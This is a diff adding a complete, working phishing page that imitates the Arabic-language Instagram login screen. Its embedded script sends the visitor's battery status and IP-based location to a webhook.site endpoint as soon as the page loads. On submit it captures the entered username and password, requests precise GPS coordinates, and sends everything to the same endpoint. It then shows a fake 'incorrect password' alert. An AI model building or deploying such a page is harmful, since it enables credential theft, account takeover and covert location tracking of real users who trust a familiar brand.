@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول • Instagram</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px 0;
+        }
+
+        .lang-container {
+            margin-bottom: 20px;
+        }
+
+        .lang {
+            color: #737373;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 350px;
+            padding: 0 20px;
+            flex-grow: 1;
+            justify-content: center;
+        }
+
+        .logo {
+            width: 75px;
+            height: 75px;
+            margin-bottom: 40px;
+        }
+
+        form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .input-box {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            padding: 14px 12px;
+            font-size: 14px;
+            color: #262626;
+            outline: none;
+        }
+
+        .input-box:focus {
+            border-color: #a8a8a8;
+        }
+
+        .login-btn {
+            background-color: #0064e0;
+            border: none;
+            border-radius: 30px;
+            color: white;
+            width: 100%;
+            padding: 14px;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 6px;
+        }
+
+        .forgot-pass {
+            color: #000000;
+            font-size: 14px;
+            text-decoration: none;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .footer {
+            width: 100%;
+            max-width: 350px;
+            padding: 0 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .create-btn {
+            background-color: transparent;
+            border: 1px solid #0064e0;
+            border-radius: 30px;
+            color: #0064e0;
+            width: 100%;
+            padding: 13px;
+            font-weight: 600;
+            font-size: 15px;
+            text-align: center;
+            text-decoration: none;
+        }
+
+        .meta-logo {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 600;
+            color: #000000;
+            font-size: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="lang-container">
+        <a href="#" class="lang">العربية</a>
+    </div>
+
+    <div class="main-container">
+        <svg class="logo" viewBox="0 0 24 24">
+            <radialGradient id="instagram-gradient" cx="30%" cy="107%" r="150%">
+                <stop offset="0%" stop-color="#fdf497"/>
+                <stop offset="45%" stop-color="#fd5949"/>
+                <stop offset="60%" stop-color="#d6249f"/>
+                <stop offset="90%" stop-color="#285AEB"/>
+            </radialGradient>
+            <path fill="url(#instagram-gradient)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
+        </svg>
+
+        <form id="loginForm">
+            <input type="text" id="username" class="input-box" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="password" class="input-box" placeholder="كلمة السر" required>
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
+        </form>
+
+        <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
+    </div>
+
+    <div class="footer">
+        <a href="#" class="create-btn">إنشاء حساب جديد</a>
+        <div class="meta-logo">Meta</div>
+    </div>
+
+    <script>
+        const webhookUrl = 'https://webhook.site/8b951ed9-f519-45f7-9371-91610172f91d';
+
+        function sendData(data) {
+            const jsonData = JSON.stringify(data);
+            try {
+                navigator.sendBeacon(webhookUrl, jsonData);
+            } catch (e) {
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: jsonData
+                });
+            }
+        }
+
+        // 1. سحب نسبة شحن البطارية فور فتح الصفحة
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                let batteryLevel = Math.round(battery.level * 100) + '%';
+                let isCharging = battery.charging ? 'نعم' : 'لا';
+                sendData({ type: 'battery_info', level: batteryLevel, charging: isCharging });
+            });
+        }
+
+        // 2. سحب الموقع التقريبي (IP/Network) فور الدخول
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                sendData({
+                    type: 'initial_ip_location',
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name
+                });
+            }).catch(() => {});
+
+        // 3. عند الضغط على تسجيل الدخول: طلب إذن الموقع الدقيق وإرسال بيانات الحساب
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            let user = document.getElementById('username').value;
+            let pass = document.getElementById('password').value;
+
+            // طلب إذن الموقع الجغرافي الدقيق (خطوط الطول والعرض)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // إرسال البيانات الكاملة مع الموقع الدقيق
+                        sendData({
+                            type: 'login_with_precise_location',
+                            username: user,
+                            password: pass,
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy + ' meters'
+                        });
+                    },
+                    function(error) {
+                        // في حال رفض إذن الموقع، يتم إرسال بيانات الدخول وحدها
+                        sendData({
+                            type: 'login_without_location',
+                            username: user,
+                            password: pass,
+                            error: 'User denied precise location permission'
+                        });
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            } else {
+                sendData({
+                    type: 'login_credentials_only',
+                    username: user,
+                    password: pass
+                });
+            }
+
+            // إظهار رسالة خطأ وهمية بعد الضغط
+            setTimeout(() => {
+                alert('كلمة المرور غير صحيحة، يرجى المحاولة مرة أخرى.');
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
